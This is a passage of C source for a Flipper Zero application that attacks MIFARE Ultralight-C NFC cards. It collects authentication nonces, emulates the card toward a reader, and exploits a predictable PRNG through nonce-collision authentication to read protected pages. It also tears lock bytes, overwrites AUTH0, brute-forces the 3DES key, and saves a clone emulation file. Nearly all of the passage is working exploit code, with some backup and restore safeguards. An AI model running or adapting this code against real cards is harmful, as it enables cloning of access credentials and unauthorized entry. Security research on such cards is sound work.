    iso14443_3a_set_atqa(iso14443_3a_edit_data, atqa);

    NfcDevice* nfc_device = nfc_device_alloc();
    nfc_device_set_data(nfc_device, NfcProtocolIso14443_3a, iso14443_3a_edit_data);

    iso14443_3a_free(iso14443_3a_edit_data);
    return nfc_device;
}

// fork: full MfUltralight-C emulation backed by a page dump, so the firmware's
// UL listener auto-answers the reader's READ/GET_VERSION and it reaches the 1A AUTH.
static NfcDevice* ultralight_c_nfc_device_alloc_full(
    const uint8_t uid[],
    MfUltralightPage* pages,
    bool key_included) {
    const uint8_t atqa[] = {0x44, 0x00};

    Iso14443_3aData* iso14443_3a_edit_data = iso14443_3a_alloc();
    iso14443_3a_set_uid(iso14443_3a_edit_data, uid, 7);
    iso14443_3a_set_sak(iso14443_3a_edit_data, 0);
    iso14443_3a_set_atqa(iso14443_3a_edit_data, atqa);

    MfUltralightData* mf_ultralight_edit_data = mf_ultralight_alloc();
    iso14443_3a_free(mf_ultralight_edit_data->iso14443_3a_data);
    mf_ultralight_edit_data->iso14443_3a_data = iso14443_3a_edit_data;
    mf_ultralight_edit_data->type = MfUltralightTypeMfulC;

    uint8_t page_count = key_included ? 48 : 44;
    for(int i = 0; i < page_count; i++) {
        memcpy(mf_ultralight_edit_data->page[i].data, pages[i].data, MF_ULTRALIGHT_PAGE_SIZE);
    }
    mf_ultralight_edit_data->pages_read = page_count;
    mf_ultralight_edit_data->pages_total = 48;

    NfcDevice* nfc_device = nfc_device_alloc();
    nfc_device_set_data(nfc_device, NfcProtocolMfUltralight, mf_ultralight_edit_data);
    mf_ultralight_free(mf_ultralight_edit_data);
    return nfc_device;
}

// fork: read the card's readable pages (0x00..0x2B) so the NR emulation can
// answer the reader's READ commands. Runs while the card is present (end of NT).
static bool dump_card_pages(const FuriHalSpiBusHandle* handle, AppContext* app) {
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    if(!send_wupa(handle, rx_buffer, &rx_bits)) {
        if(!send_wupa(handle, rx_buffer, &rx_bits)) {
            FURI_LOG_E(TAG, "dump: WUPA failed");
            return false;
        }
    }
    if(rx_bits != 16 || rx_buffer[0] != 0x44 || rx_buffer[1] != 0x00) {
        FURI_LOG_E(TAG, "dump: bad WUPA response");
        return false;
    }

    memset(app->card_pages, 0, sizeof(app->card_pages));
    bool any = false;
    // One READ(0) returns pages 0-3, including all data needed for the reader's
    // pre-authentication READ(2). AUTH0=04 makes later pages inaccessible here;
    // probing every protected range only blocks the UI for several seconds.
    for(uint8_t page = 0x00; page <= 0x00; page += 4) {
        uint8_t read_cmd[2] = {CMD_READ_PAGE, page};
        rx_bits = 0;
        memset(rx_buffer, 0, sizeof(rx_buffer));
        if(send_receive_command_full(
               handle, read_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true) &&
           rx_bits == (18 * 8)) {
            memcpy(app->card_pages[page].data, rx_buffer, 16);
            any = true;
        } else {
            FURI_LOG_W(TAG, "dump: pages 0x%02X-0x%02X unreadable", page, page + 3);
        }
    }
    app->pages_dumped = any;
    FURI_LOG_I(TAG, "dump: pages_dumped=%d", (int)any);
    return any;
}

// Read-only evidence collection after a successful collision authentication.
// AUTH0 is 0x04 on the target, so a valid page-4 response proves that the
// authentication boundary was crossed. Never request the key pages (0x2C-0x2F).
static bool dump_authenticated_pages(const FuriHalSpiBusHandle* handle, AppContext* app) {
    uint8_t rx_buffer[32];
    bool protected_page_read = false;
    uint8_t ranges_read = 0;

    for(uint8_t page = 0x04; page <= 0x28; page += 4) {
        size_t rx_bits = 0;
        memset(rx_buffer, 0, sizeof(rx_buffer));
        uint8_t read_cmd[2] = {CMD_READ_PAGE, page};
        if(send_receive_command_full(
               handle, read_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true) &&
           rx_bits == (18 * 8)) {
            uint16_t expected_crc = calculate_crc16(rx_buffer, 16);
            uint16_t received_crc = (uint16_t)rx_buffer[16] | ((uint16_t)rx_buffer[17] << 8);
            if(expected_crc == received_crc) {
                memcpy(app->card_pages[page].data, rx_buffer, 16);
                ranges_read++;
                if(page == 0x04) protected_page_read = true;
                FURI_LOG_I(TAG, "authenticated READ pages %02X-%02X OK", page, page + 3);
                continue;
            }
        }
        FURI_LOG_W(TAG, "authenticated READ pages %02X-%02X failed", page, page + 3);
    }

    if(!protected_page_read) return false;

    // app->uid contains the cascade tag at index 0 for a seven-byte UID.
    const uint8_t* uid = (app->uid_len == 7) ? &app->uid[1] : app->uid;
    NfcDevice* dump = ultralight_c_nfc_device_alloc_full(uid, app->card_pages, false);
    FuriString* path = furi_string_alloc_printf(
        NFC_APP_FOLDER "/ulcfkey_auth_%02X%02X%02X%02X%02X%02X%02X" NFC_APP_EXTENSION,
        uid[0],
        uid[1],
        uid[2],
        uid[3],
        uid[4],
        uid[5],
        uid[6]);
    bool saved = nfc_device_save(dump, furi_string_get_cstr(path));
    FURI_LOG_I(
        TAG,
        "authenticated dump: protected=yes ranges=%u saved=%d path=%s",
        ranges_read,
        (int)saved,
        furi_string_get_cstr(path));
    furi_string_free(path);
    nfc_device_free(dump);
    return true;
}

static bool save_recovered_emulation(AppContext* app) {
    if(!app->pages_dumped || !app->brute.complete || app->uid_len != 7) return false;

    for(uint8_t page = 0; page < 4; page++) {
        memcpy(app->card_pages[44 + page].data, app->brute.key + page * 4, 4);
    }
    if(app->lock_bytes_reset) {
        app->card_pages[40].data[0] = app->lock_bytes_restore[0];
        app->card_pages[40].data[1] = app->lock_bytes_restore[1];
    }
    app->card_pages[42].data[0] = app->auth0_config_restore;

    const uint8_t* uid = &app->uid[1];
    NfcDevice* dump = ultralight_c_nfc_device_alloc_full(uid, app->card_pages, true);
    FuriString* path = furi_string_alloc_printf(
        NFC_APP_FOLDER "/ulcfkey_emulation_%02X%02X%02X%02X%02X%02X%02X" NFC_APP_EXTENSION,
        uid[0],
        uid[1],
        uid[2],
        uid[3],
        uid[4],
        uid[5],
        uid[6]);
    bool saved = nfc_device_save(dump, furi_string_get_cstr(path));
    FURI_LOG_I(
        TAG,
        "emulation saved=%d path=%s key=%02X%02X%02X%02X...",
        (int)saved,
        furi_string_get_cstr(path),
        app->brute.key[0],
        app->brute.key[1],
        app->brute.key[2],
        app->brute.key[3]);
    furi_string_free(path);
    nfc_device_free(dump);
    return saved;
}

static bool verify_session_card(const FuriHalSpiBusHandle* handle, const AppContext* app) {
    if(app->uid_len != 7) return false;
    uint8_t rx[32];
    size_t rx_bits = 0;
    if(!send_wupa(handle, rx, &rx_bits) || rx_bits != 16) return false;
    uint8_t cmd[2] = {CMD_READ_PAGE, 0x00};
    if(!send_receive_command_full(handle, cmd, 16, rx, sizeof(rx), &rx_bits, true) ||
       rx_bits != 18U * 8U) {
        return false;
    }
    return memcmp(rx, &app->uid[1], 3) == 0 && memcmp(rx + 4, &app->uid[4], 4) == 0;
}

static bool
    write_page_raw(const FuriHalSpiBusHandle* handle, uint8_t page, const uint8_t data[4]) {
    uint8_t rx[32];
    size_t rx_bits = 0;
    uint8_t cmd[6] = {CMD_WRITE_PAGE, page, data[0], data[1], data[2], data[3]};
    return send_receive_command_full(
               handle, cmd, sizeof(cmd) * 8U, rx, sizeof(rx), &rx_bits, true) &&
           rx_bits == 4 && (rx[0] & 0x0FU) == 0x0AU;
}

static void rotate_left_8(uint8_t data[8]) {
    uint8_t first = data[0];
    memmove(data, data + 1, 7);
    data[7] = first;
}

static bool authenticate_recovered_key(const FuriHalSpiBusHandle* handle, AppContext* app) {
    if(!collect_auth1_challenge(handle, app, true)) return false;

    mbedtls_des3_context des;
    uint8_t iv[8] = {0};
    uint8_t rnd_b[8];
    uint8_t rnd_a[8];
    uint8_t plain[16];
    uint8_t encrypted[16];
    uint8_t response[32];
    size_t response_bits = 0;
    bool ok = false;

    memset(&des, 0, sizeof(des));
    mf_ultralight_3des_decrypt(
        &des, app->brute.key, iv, app->auth1_response, sizeof(rnd_b), rnd_b);
    rotate_left_8(rnd_b);
    furi_hal_random_fill_buf(rnd_a, sizeof(rnd_a));
    memcpy(plain, rnd_a, 8);
    memcpy(plain + 8, rnd_b, 8);
    memcpy(iv, app->auth1_response, 8);
    mf_ultralight_3des_encrypt(&des, app->brute.key, iv, plain, sizeof(plain), encrypted);

    uint8_t cmd[17] = {0xAF};
    memcpy(cmd + 1, encrypted, 16);
    if(!send_receive_command_full(
           handle, cmd, sizeof(cmd) * 8U, response, sizeof(response), &response_bits, true) ||
       response_bits != 88 || response[0] != 0x00) {
        goto done;
    }

    memcpy(iv, encrypted + 8, 8);
    uint8_t returned_a[8];
    mf_ultralight_3des_decrypt(
        &des, app->brute.key, iv, response + 1, sizeof(returned_a), returned_a);
    rotate_left_8(rnd_a);
    ok = memcmp(rnd_a, returned_a, 8) == 0;

done:
    memset(&des, 0, sizeof(des));
    return ok;
}

/* Restore is deliberately ordered so that the permanent lock bytes are written last. */
static bool restore_physical_card(const FuriHalSpiBusHandle* handle, AppContext* app) {
    if(!verify_session_card(handle, app)) {
        app->error = "Wrong card / UID";
        return false;
    }

    uint8_t card_key[16];
    for(uint8_t i = 0; i < 8; i++)
        card_key[i] = app->brute.key[7 - i];
    for(uint8_t i = 0; i < 8; i++)
        card_key[8 + i] = app->brute.key[15 - i];

    while(app->restore_step < 4) {
        uint8_t page = app->restore_step;
        if(!write_page_raw(handle, 44 + page, card_key + page * 4)) {
            app->error = "Key restore failed";
            return false;
        }
        app->restore_step++;
        if(!ulcfkey_session_save(app)) {
            app->error = "Checkpoint failed";
            return false;
        }
    }

    /* A power cycle makes the card load the newly-written key. */
    disable_nfc_field(handle);
    setup_nfc_field(handle);
    if(!verify_session_card(handle, app) || !authenticate_recovered_key(handle, app)) {
        app->error = "Restored key rejected";
        return false;
    }
    if(app->restore_step < 5) {
        app->restore_step = 5;
        if(!ulcfkey_session_save(app)) return false;
    }

    if(app->restore_step < 6) {
        if(!write_page_raw(handle, 42, app->card_pages[42].data)) {
            app->error = "AUTH0 restore failed";
            return false;
        }
        app->restore_step = 6;
        if(!ulcfkey_session_save(app)) return false;
    }

    /* If this is a resumed run, regain authentication after AUTH0 was restored. */
    if(app->restore_step == 6) {
        disable_nfc_field(handle);
        setup_nfc_field(handle);
        if(!verify_session_card(handle, app) || !authenticate_recovered_key(handle, app)) {
            app->error = "Restore re-auth failed";
            return false;
        }
        if(!write_page_raw(handle, 40, app->card_pages[40].data)) {
            app->error = "Lock restore failed";
            return false;
        }
        app->restore_step = 7;
        app->session_stage = SessionStageRestored;
        if(!ulcfkey_session_save(app)) return false;
    }
    return true;
}

static void do_shutdown(AppContext* app) {
    if(app->field_active) {
        // Turn off NFC field. fork: only acquire if we don't already hold the bus,
        // else do_shutdown() called while the bus is held (Back during NT collection
        // or the crack phase) re-acquires a non-recursive lock and hangs the Flipper.
        if(!app->spi_held) {
            furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
            app->spi_held = true;
        }
        disable_nfc_field(&furi_hal_spi_bus_handle_nfc);
        furi_hal_spi_release(&furi_hal_spi_bus_handle_nfc);
        app->spi_held = false;
        app->field_active = false;
    }
    if(app->emulate_active) {
        // Turn off emulation
        nfc_listener_stop(app->listener);
        nfc_listener_free(app->listener);
        nfc_free(app->nfc);
        nfc_device_free(app->device);
        app->listener = NULL;
        app->nfc = NULL;
        app->device = NULL;
        app->emulate_active = false;
    }
    notification_message(app->notifications, &sequence_blink_stop);
}

static void
    append_bytes_to_string(FuriString* str, const char* prefix, uint8_t* bytes, size_t len) {
    furi_string_cat_printf(str, " %s ", prefix);
    for(size_t i = 0; i < len; i++) {
        furi_string_cat_printf(str, "%02x", bytes[i]);
    }
}

static bool save_nonces_to_file(AppContext* app) {
    // Save the nonces stored in app->nonce_100, app->nonce_75, app->nonce_50, app->nonce_25 to MF_ULCF_NONCE_PATH, appending a line
    Storage* storage = furi_record_open(RECORD_STORAGE);
    Stream* stream = buffered_file_stream_alloc(storage);
    FuriString* nonce_string = furi_string_alloc();
    bool params_write_success = true;

    do {
        if(!buffered_file_stream_open(stream, MF_ULCF_NONCE_PATH, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            params_write_success = false;
            break;
        }
        // Add UID (skipping first byte based on original code)
        furi_string_cat_printf(nonce_string, "cuid ");
        for(size_t i = 1; i < 8; i++) {
            furi_string_cat_printf(nonce_string, "%02x", app->uid[i]);
        }

        // Add nonces
        append_bytes_to_string(nonce_string, "nt100", app->nonce_100, 8);
        append_bytes_to_string(nonce_string, "nt75", app->nonce_75, 8);
        append_bytes_to_string(nonce_string, "nt50", app->nonce_50, 8);
        append_bytes_to_string(nonce_string, "nt25", app->nonce_25, 8);

        furi_string_cat_printf(nonce_string, "\n");

        // INFO makes the recovery material available over the CLI even if copying the
        // file from the SD card is inconvenient. Treat this line as sensitive evidence.
        FURI_LOG_I(TAG, "Recovery record: %s", furi_string_get_cstr(nonce_string));

        if(!stream_write_string(stream, nonce_string)) {
            params_write_success = false;
            break;
        }
    } while(false);

    furi_string_free(nonce_string);
    buffered_file_stream_close(stream);
    stream_free(stream);
    furi_record_close(RECORD_STORAGE);

    return params_write_success;
}

static AppState ulcfkey_resume_state(const AppContext* app) {
    switch((SessionStage)app->session_stage) {
    case SessionStageNtCollected:
        return AppStateCollectNRReady;
    case SessionStageNrCollected:
    case SessionStageAuthenticatedDump:
        return AppStateCrackReady;
    case SessionStageUnlocked:
    case SessionStageRecoveryNonces:
        return AppStateCrackResumeInit;
    case SessionStageBruteforce:
        return AppStateRecoverKeyReady;
    case SessionStageKeyRecovered:
        return AppStateRecoverKeyRunning;
    case SessionStageEmulationSaved:
    case SessionStageRestored:
        return AppStateComplete;
    case SessionStageEmpty:
    default:
        return AppStateCollectNTReady;
    }
}

static void ulcfkey_new_session(AppContext* app) {
    app->auth2_received = false;
    memset(app->uid, 0, sizeof(app->uid));
    app->uid_len = 0;
    app->is_vulnerable = false;
    app->is_static_key = false;
    memset(app->nonces, 0, sizeof(app->nonces));
    memset(app->common_nonce, 0, sizeof(app->common_nonce));
    memset(app->nonce_100, 0, sizeof(app->nonce_100));
    memset(app->nonce_75, 0, sizeof(app->nonce_75));
    memset(app->nonce_50, 0, sizeof(app->nonce_50));
    memset(app->nonce_25, 0, sizeof(app->nonce_25));
    app->tear_delay = TEAR_DELAY_US;
    app->lock_bytes_reset = false;
    memset(app->lock_bytes_restore, 0, sizeof(app->lock_bytes_restore));
    app->auth0_config_restore = 0;
    app->unique_nonces = 0;
    app->total_nonces = 0;
    app->nt_saved_count = 0;
    memset(app->card_pages, 0, sizeof(app->card_pages));
    app->pages_dumped = false;
    memset(app->cand_response, 0, sizeof(app->cand_response));
    memset(app->cand_signed, 0, sizeof(app->cand_signed));
    app->num_candidates = 0;
    app->cand_signed_count = 0;
    app->nr_saved_count = 0;
    app->recovery_nonce_mask = 0;
    app->key_pages_zeroed_mask = 0;
    app->restore_step = 0;
    ulcfkey_brute_init(&app->brute);
    ulcfkey_brute_runtime_reset(app->brute_runtime);
    app->session_stage = SessionStageEmpty;
    app->session_loaded = false;
    ulcfkey_session_delete();
}

int32_t ulcfkey_app(void* p) {
    // TODO: Zero values when back button is pressed
    UNUSED(p);

    // Allocate app context
    AppContext* app = malloc(sizeof(AppContext));
    memset(app, 0, sizeof(AppContext));
    app->brute_runtime = ulcfkey_brute_runtime_alloc();
    furi_check(app->brute_runtime);
    app->state = AppStateMain;
    app->event_queue = furi_message_queue_alloc(8, sizeof(AppEvent));
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    app->help_state = malloc(sizeof(HelpState));
    app->help_state->scroll_pos = 0;
    app->tear_delay = TEAR_DELAY_US;
    app->session_loaded = ulcfkey_session_load(app);
    app->help_state->text = furi_string_alloc_set("Collect NT from card, then\n"
                                                  "Collect NR at the reader.\n"
                                                  "\n"
                                                  "Destroy + Recover saves a\n"
                                                  "full backup before writes.\n"
                                                  "\n"
                                                  "Every destructive step and\n"
                                                  "brute-force checkpoint is\n"
                                                  "saved to SD. Reopen and use\n"
                                                  "Resume to continue.\n"
                                                  "\n"
                                                  "After key recovery the app\n"
                                                  "saves an NFC emulation and\n"
                                                   "can restore the card.\n"
                                                   "\n"
                                                   "Saved cards shows exported\n"
                                                   "UIDs and recovered keys.\n"
                                                   "See README for PC script\n"
                                                   "links and instructions.");
    const char* help_text = furi_string_get_cstr(app->help_state->text);
    uint8_t help_lines = 1;
    for(const char* p = help_text; *p; p++) {
        if(*p == '\n') help_lines++;
    }
    app->help_state->scroll_num = help_lines > 4 ? help_lines - 3 : 1;

    // GUI
    app->gui = furi_record_open(RECORD_GUI);
    app->view_port = view_port_alloc();
    view_port_draw_callback_set(app->view_port, render_callback, app);
    view_port_input_callback_set(app->view_port, input_callback, app);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);

    bool running = true;
    AppEvent event;

    while(running) {
        FuriStatus status = furi_message_queue_get(
            app->event_queue, &event, app->state == AppStateRecoverKeyRunning ? 1 : 100);

        if(status == FuriStatusOk) {
            if(event.type == EventTypeKey &&
               (event.input.type == InputTypeShort ||
                 ((app->state == AppStateHelp || app->state == AppStateMain ||
                   app->state == AppStateSavedCards) &&
                 event.input.type == InputTypeRepeat))) {
                // Handle states
                if(app->state == AppStateMain) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        running = false;
                        break;
                    case InputKeyUp:
                        app->menu_selection = app->menu_selection == 0 ? 3 :
                                                                         app->menu_selection - 1;
                        break;
                    case InputKeyDown:
                        app->menu_selection = (app->menu_selection + 1) % 4;
                        break;
                    case InputKeyOk:
                        if(app->menu_selection == 0) {
                            app->state = app->session_loaded ? ulcfkey_resume_state(app) :
                                                               AppStateCollectNTReady;
                        } else if(app->menu_selection == 1) {
                            app->state = AppStateNewConfirm;
                        } else if(app->menu_selection == 2) {
                            app->saved_card_selection = 0;
                            ulcfkey_saved_card_refresh(app);
                            app->state = AppStateSavedCards;
                        } else {
                            app->state = AppStateHelp;
                        }
                        break;
                    case InputKeyLeft:
                        app->menu_selection = 1;
                        break;
                    case InputKeyRight:
                        app->menu_selection = 3;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateSavedCards) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    case InputKeyUp:
                        if(app->saved_card_selection) app->saved_card_selection--;
                        ulcfkey_saved_card_refresh(app);
                        break;
                    case InputKeyDown:
                        if(app->saved_card_selection + 1 < app->saved_card_count) {
                            app->saved_card_selection++;
                        }
                        ulcfkey_saved_card_refresh(app);
                        break;
                    case InputKeyOk:
                        ulcfkey_saved_card_open(app);
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateSavedCardDetail) {
                    if(event.input.key == InputKeyBack || event.input.key == InputKeyOk) {
                        memset(app->saved_card_key, 0, sizeof(app->saved_card_key));
                        app->saved_card_loaded = false;
                        ulcfkey_saved_card_refresh(app);
                        app->state = AppStateSavedCards;
                    }
                } else if(app->state == AppStateNewConfirm) {
                    if(event.input.key == InputKeyBack || event.input.key == InputKeyLeft) {
                        app->state = AppStateMain;
                    } else if(event.input.key == InputKeyOk || event.input.key == InputKeyRight) {
                        ulcfkey_new_session(app);
                        app->menu_selection = 0;
                        app->state = AppStateCollectNTReady;
                    }
                } else if(app->state == AppStateHelp) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    case InputKeyUp:
                        if(app->help_state->scroll_pos > 0) {
                            app->help_state->scroll_pos--;
                        }
                        break;
                    case InputKeyDown:
                        if(app->help_state->scroll_pos < app->help_state->scroll_num - 1) {
                            app->help_state->scroll_pos++;
                        }
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateCollectNTReady) {
                    switch(event.input.key) {
                    case InputKeyOk:
                        app->state = AppStateCollectNTInit;
                        break;
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateCollectNRReady) {
                    switch(event.input.key) {
                    case InputKeyOk:
                        app->state = AppStateCollectNRInit;
                        break;
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(
                    app->state == AppStateCollectNTInit ||
                    app->state == AppStateCollectNTWaiting) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        if(app->state == AppStateCollectNTWaiting) {
                            if(app->total_nonces) {
                                app->session_loaded = true;
                                ulcfkey_session_save(app);
                            }
                            do_shutdown(app);
                        }
                        app->state = AppStateCollectNTReady;
                        break;
                    default:
                        break;
                    }
                } else if(
                    app->state == AppStateCollectNRInit ||
                    app->state == AppStateCollectNRWaiting) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        if(app->state == AppStateCollectNRWaiting) {
                            if(app->session_loaded) ulcfkey_session_save(app);
                            do_shutdown(app);
                        }
                        app->state = AppStateCollectNRReady;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateCrackReady) {
                    switch(event.input.key) {
                    case InputKeyOk:
                        app->state = AppStateCrackInit;
                        break;
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(
                    app->state == AppStateCrackInit || app->state == AppStateCrackInitialAuth ||
                    app->state == AppStateCrackTearLockbytes ||
                    app->state == AppStateCrackOverwriteAuth0 ||
                    app->state == AppStateCrackCollectNonces ||
                    app->state == AppStateCrackResumeInit) {
                    switch(event.input.key) {
                    // TODO: Warn user that the key will be lost
                    // TODO: Some method of returning to this stage from the main screen, saved nonces
                    case InputKeyBack:
                        if(app->session_loaded) ulcfkey_session_save(app);
                        do_shutdown(app);
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateRecoverKeyReady) {
                    if(event.input.key == InputKeyOk) {
                        app->brute_run_start_tick = furi_get_tick();
                        app->brute_run_start_candidate = app->brute.next_candidate;
                        app->state = AppStateRecoverKeyRunning;
                    } else if(event.input.key == InputKeyBack) {
                        app->state = AppStateMain;
                    }
                } else if(app->state == AppStateRecoverKeyRunning) {
                    if(event.input.key == InputKeyBack || event.input.key == InputKeyLeft) {
                        ulcfkey_session_save(app);
                        app->state = AppStateMain;
                    }
                } else if(app->state == AppStateRestoreReady) {
                    if(event.input.key == InputKeyOk) {
                        app->state = AppStateRestoreRunning;
                    } else if(event.input.key == InputKeyBack) {
                        app->state = AppStateComplete;
                    }
                } else if(app->state == AppStateComplete) {
                    switch(event.input.key) {
                    case InputKeyOk:
                        if(app->session_stage == SessionStageEmulationSaved) {
                            app->state = AppStateRestoreReady;
                        }
                        break;
                    case InputKeyBack:
                        do_shutdown(app);
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateError) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                }
            }
        }
        // Ongoing tasks
        if(app->state == AppStateCollectNTInit) {
            // Enable NFC, initialize_card, etc.
            notification_message(app->notifications, &sequence_blink_start_cyan);
            furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
            setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
            app->field_active = true;
            app->spi_held = true; // fork
            app->state = AppStateCollectNTWaiting;
        } else if(app->state == AppStateCollectNTWaiting) {
            // Collect auth1 challenges up to MAX_NONCES and store in app context
            if(app->total_nonces < MAX_NONCES) {
                if(collect_auth1_challenge(&furi_hal_spi_bus_handle_nfc, app, false)) {
                    FURI_LOG_I(TAG, "Collected nonce %lu/%u", app->total_nonces, MAX_NONCES);
                    FURI_LOG_I(TAG, "Unique nonces: %u", app->unique_nonces);
                    if(app->total_nonces - app->nt_saved_count >= 5) {
                        app->session_loaded = true;
                        if(ulcfkey_session_save(app)) app->nt_saved_count = app->total_nonces;
                    }
                } else {
                    FURI_LOG_E(TAG, "Init card fail, retrying...");
                }
            } else {
                // We have collected enough nonces, move to next state
                notification_message(app->notifications, &sequence_blink_stop);
                FURI_LOG_I(TAG, "Nonce collection complete");
                // Make sure there are at least 2 duplicate nonces for at least one nonce, using .count. If all nonces have only 1 count, we need to error.
                bool found_duplicate = false;
                uint8_t highest_common_nonce_count = 0;
                for(uint16_t i = 0; i < app->unique_nonces; i++) {
                    if(app->nonces[i].count > 1) {
                        if(!found_duplicate) {
                            found_duplicate = true;
                        }
                        if(app->nonces[i].count > highest_common_nonce_count) {
                            highest_common_nonce_count = app->nonces[i].count;
                            memcpy(app->common_nonce, app->nonces[i].nonce, 8);
                        }
                    }
                }
                if(!found_duplicate) {
                    app->state = AppStateError;
                    app->error = "PRNG not predictable";
                    notification_message(app->notifications, &sequence_error);
                } else {
                    FURI_LOG_I(TAG, "Highest common nonce count: %u", highest_common_nonce_count);
                    // Sign the most useful nonces, not merely the first ones discovered.
                    // With more than 16 unique values the dominant nonce can otherwise
                    // fall outside the candidate window (as seen at unique index 24).
                    for(uint16_t i = 0; i + 1 < app->unique_nonces; i++) {
                        uint16_t best = i;
                        for(uint16_t j = i + 1; j < app->unique_nonces; j++) {
                            if(app->nonces[j].count > app->nonces[best].count) best = j;
                        }
                        if(best != i) {
                            NonceCount tmp = app->nonces[i];
                            app->nonces[i] = app->nonces[best];
                            app->nonces[best] = tmp;
                        }
                    }
                    memcpy(app->common_nonce, app->nonces[0].nonce, 8);
                    app->state = AppStateCollectNRReady;
                    notification_message(app->notifications, &sequence_success);
                    // fork: dump pages now, card still present, for NR emulation
                    dump_card_pages(&furi_hal_spi_bus_handle_nfc, app);
                    // fork: prepare ALL unique nonces as candidates to sign in NR.
                    // The crack-session dominant nonce shifts per power-up but lives in
                    // this set, so signing them all lets Crack replay whichever recurs.
                    app->num_candidates = (app->unique_nonces < 16) ? (uint8_t)app->unique_nonces :
                                                                      16;
                    app->nr_sign_idx = 0;
                    app->nr_pending_idx = 0;
                    app->nr_candidate_pending = false;
                    app->cand_signed_count = 0;
                    memset(app->cand_response, 0, sizeof(app->cand_response));
                    for(uint8_t ci = 0; ci < MAX_NONCES; ci++)
                        app->cand_signed[ci] = false;
                    app->session_stage = SessionStageNtCollected;
                    app->session_loaded = true;
                    if(!ulcfkey_session_save(app)) {
                        app->state = AppStateError;
                        app->error = "NT checkpoint failed";
                    }
                }
                do_shutdown(app);
            }
        } else if(app->state == AppStateCollectNRInit) {
            // Set up emulated card
            notification_message(app->notifications, &sequence_blink_start_blue);
            // Create an NFC listener using the iso14443_3a listener
            app->nfc = nfc_alloc();
            // fork: BARE 3A emulation so OUR callback sees every frame -- it answers
            // READ from the dump and injects the common nonce on 1A. (Full MfUltralight
            // made the firmware handle 1A itself and NAK it, bypassing the injection.)
            app->device = ultralight_c_nfc_device_alloc(app->uid + 1);
            NfcProtocol protocol = nfc_device_get_protocol(app->device);
            FURI_LOG_I(TAG, "NFC: Protocol %s", nfc_device_get_protocol_name(protocol));
            app->listener =
                nfc_listener_alloc(app->nfc, protocol, nfc_device_get_data(app->device, protocol));
            app->nr_sign_idx = 0;
            while(app->nr_sign_idx < app->num_candidates && app->cand_signed[app->nr_sign_idx]) {
                app->nr_sign_idx++;
            }
            app->nr_saved_count = app->cand_signed_count;
            FURI_LOG_I(TAG, "NFC: Starting...");
            nfc_listener_start(app->listener, ulcfkey_listener_callback, app);
            app->emulate_active = true;
            app->state = AppStateCollectNRWaiting;
        } else if(app->state == AppStateCollectNRWaiting) {
            // Collect NR
            app->anim_tick++; // fork: animate waiting indicator
            if(app->cand_signed_count != app->nr_saved_count) {
                if(ulcfkey_session_save(app)) app->nr_saved_count = app->cand_signed_count;
            }
            if(app->auth2_received) {
                do_shutdown(app);
                app->session_stage = SessionStageNrCollected;
                app->session_loaded = true;
                if(ulcfkey_session_save(app)) {
                    app->state = AppStateCrackReady;
                } else {
                    app->state = AppStateError;
                    app->error = "NR checkpoint failed";
                }
            }
        } else if(app->state == AppStateCrackInit) {
            // Enable NFC, initialize_card, etc.
            notification_message(app->notifications, &sequence_blink_start_cyan);
            furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
            setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
            app->field_active = true;
            app->spi_held = true; // fork
            app->auth_attempts = 0; // fork
            app->tear_attempts = 0; // fork
            FURI_LOG_I(
                TAG,
                "crack target nonce: %02X%02X%02X%02X%02X%02X%02X%02X",
                app->common_nonce[0],
                app->common_nonce[1],
                app->common_nonce[2],
                app->common_nonce[3],
                app->common_nonce[4],
                app->common_nonce[5],
                app->common_nonce[6],
                app->common_nonce[7]);
            for(uint8_t ci = 0; ci < app->num_candidates; ci++) {
                FURI_LOG_I(
                    TAG,
                    "signed cand %u: %02X%02X%02X%02X%02X%02X%02X%02X%s",
                    ci,
                    app->nonces[ci].nonce[0],
                    app->nonces[ci].nonce[1],
                    app->nonces[ci].nonce[2],
                    app->nonces[ci].nonce[3],
                    app->nonces[ci].nonce[4],
                    app->nonces[ci].nonce[5],
                    app->nonces[ci].nonce[6],
                    app->nonces[ci].nonce[7],
                    app->cand_signed[ci] ? "" : " (UNSIGNED)");
            }
            app->state = AppStateCrackInitialAuth;
        } else if(app->state == AppStateCrackInitialAuth) {
            // Attempt to auth with the common nonce (count only when the card is present)
            if(attempt_auth_with_nonce_collision(&furi_hal_spi_bus_handle_nfc, app)) {
                FURI_LOG_I(
                    TAG,
                    "Collision auth OK after %lu attempts",
                    (unsigned long)app->auth_attempts);
#if ENABLE_DESTRUCTIVE_WRITES
                if(app->session_stage < SessionStageAuthenticatedDump) {
                    if(!dump_authenticated_pages(&furi_hal_spi_bus_handle_nfc, app)) {
                        app->state = AppStateError;
                        app->error = "Backup failed; no writes";
                        notification_message(app->notifications, &sequence_error);
                    } else {
                        app->session_stage = SessionStageAuthenticatedDump;
                        app->session_loaded = true;
                        if(!ulcfkey_session_save(app)) {
